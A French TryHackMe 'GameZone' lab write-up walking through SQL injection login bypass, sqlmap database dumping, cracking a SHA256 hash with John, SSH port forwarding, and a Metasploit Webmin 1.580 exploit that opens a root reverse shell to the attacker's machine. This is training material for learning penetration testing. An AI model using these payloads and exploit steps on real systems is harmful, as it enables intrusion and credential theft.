---
tags: [avancé, cyber, sqli, sqlmap, tryhackme]
title: TryHackMe - GameZone
created: '2020-08-18T07:32:27.270Z'
modified: '2020-08-18T19:48:37.596Z'
---

# TryHackMe - GameZone

Premièrement j'ajoute l'IP dans `/etc/hosts` pour faire une résolution de noms de domaines locale. Ajouter la ligne :

```sh
# TryHackMe
10.10.132.106 gamezone.thm
```

Ainsi on n'a plus à écrire l'IP dans le navigateur mais bien `gamezone.thm`.

## Obtain access via SQLi 

Login : `' or 1=1 -- -`
Password : 

On arrive alors sur `http://gamezone.thm/portal.php`

## Using SQLMap 

SQLMap est un outil populaire de source ouverte, d'injection automatique de SQL et de reprise de base de données. Il est préinstallé sur toutes les versions de Kali Linux ou peut être téléchargé et installé manuellement ici.

Il existe de nombreux types différents d'injection SQL (boolean / time based, etc...) et SQLMap automatise l'ensemble du processus en essayant différentes techniques.

Dans un premier temps, il faut ouvrir Burpsuite pour capturer une requête :

```sh
POST /portal.php HTTP/1.1
Host: gamezone.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gamezone.thm/portal.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
DNT: 1
Connection: close
Cookie: PHPSESSID=9d50417a07og32kbjvfv5k08b0
Upgrade-Insecure-Requests: 1

searchitem=GAME
```

On la sauvegarde dans un fichier texte `req.txt` et on lance `sqlmap` :

- `-r` utilise la demande interceptée que vous avez sauvegardée précédemment
- `--dbms` indique à SQLMap de quel type de système de gestion de base de données il s'agit
- `--dump` tente de produire la base de données complète

```sh
kali@kali:~/Documents$ sqlmap -r req.txt --dbms=mysql --dump
sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-1974' OR 7217=7217#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=GAME' AND GTID_SUBSET(CONCAT(0x7171767a71,(SELECT (ELT(9920=9920,1))),0x7162717671),9920)-- VwYa

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=GAME' AND (SELECT 4981 FROM (SELECT(SLEEP(5)))DJPW)-- EtPq

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=GAME' UNION ALL SELECT NULL,NULL,CONCAT(0x7171767a71,0x556b6c517047524b5a746d456d6473427159776563584c4b53666a7558656e414857775646496c71,0x7162717671)#
---

Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

De plus, SQLMap sauvegarde les hashs dans un fichier :

```sh
kali@kali:~/Documents$ cat /tmp/sqlmapr2zium493015/sqlmaphashes-kxkg6j7k.txt 
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

## Cracking a password with JohnTheRipper 

Nous devons d'abord trouver le format du hash ; pour cela j'utilise `https://www.tunnelsup.com/hash-analyzer/`. En analysant le hash de l'agent47, on trouve que c'est du SHA256. On va confronter ce hash avec la wordlist `rockyou.txt` :

```sh
kali@kali:~/Documents$ sudo john /tmp/sqlmapr2zium493015/sqlmaphashes-kxkg6j7k.txt --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (agent47)
1g 0:00:00:00 DONE (2020-08-18 04:13) 3.333g/s 9830Kp/s 9830Kc/s 9830KC/s vimivi..vainlove
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

Le mot de passe correspondant au hash est alors `videogamer124`.

## Exposing services with reverse SSH tunnels 

Muni du couple `agent47:videogamer124`, nous pouvons nous connecter en ssh :

```sh
kali@kali:~/Documents$ ssh agent47@gamezone.thm
Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ 
```

Utilisons `ss` pour énumérer les connexions en cours :

```sh
agent47@gamezone:~$ ss -tulnp
Netid State      Recv-Q Send-Q                                Local Address:Port                                               Peer Address:Port              
udp   UNCONN     0      0                                                 *:10000                                                         *:*                  
udp   UNCONN     0      0                                                 *:68                                                            *:*                  
tcp   LISTEN     0      80                                        127.0.0.1:3306                                                          *:*                  
tcp   LISTEN     0      128                                               *:10000                                                         *:*                  
tcp   LISTEN     0      128                                               *:22                                                            *:*                  
tcp   LISTEN     0      128                                              :::80                                                           :::*                  
tcp   LISTEN     0      128                                              :::22                                                           :::*
```

Le port `10000` semble bloqué par un parefeu, on va utiliser un `reverse ssh` pour avoir accès au flux :

```sh
kali@kali:~$ ssh -L 10000:localhost:10000 agent47@gamezone.thm
agent47@gamezone.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Tue Aug 18 03:22:05 2020 from 10.11.7.104
agent47@gamezone:~$
```

Lorsqu'on se rend sur notre navigateur : `localhost:10000`, on trouve bien une page web, celle qu'on a redirigé vers nous. De plus, le couple `agent47:videogamer124` fonctionne pour se connecter au portail.

On tombe alors sur un CMS Webmin version `1.580`.

## Privilege Escalation with Metasploit 

Lançons alors metasploit :

```sh
kali@kali:~/Documents$ sudo msfdb init
[sudo] password for kali: 
[+] Starting database
[i] The database appears to be already configured, skipping initialization
kali@kali:~/Documents$ sudo msfconsole -q
msf5 > workspace -a gamezone
[*] Added workspace: gamezone
[*] Workspace: gamezone
msf5 >
```

Recherchons les exploits disponibles :

```sh
msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
```

L'exploit N°4 a bien fonctionné, suivons la démonstration. Tout d'abord commençons par lister les options disponibles pour l'exploit :

```sh
msf5 use 4
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host
   
Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580
```

Complétons alors :

```sh
msf5 exploit(unix/webapp/webmin_upload_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(unix/webapp/webmin_upload_exec) > set password videogamer124
password => videogamer124
msf5 exploit(unix/webapp/webmin_upload_exec) > set username agent47
username => agent47
msf5 exploit(unix/webapp/webmin_upload_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > setg lhost tun0
lhost => tun0
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > setg lport 4444
lport => 4444
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580

```

Enfin, lançons l'exploit :

```sh
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > run

[*] Started reverse TCP double handler on 10.11.7.104:4444 
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo rSsusB5mGdRZ23jk;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "rSsusB5mGdRZ23jk\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.11.7.104:4444 -> 10.10.132.106:53802) at 2020-08-18 05:20:54 -0400

whoami
root
ls /root  
root.txt
cat /root/root.txt
a4b945830144bdd71908d12d902adeee
```
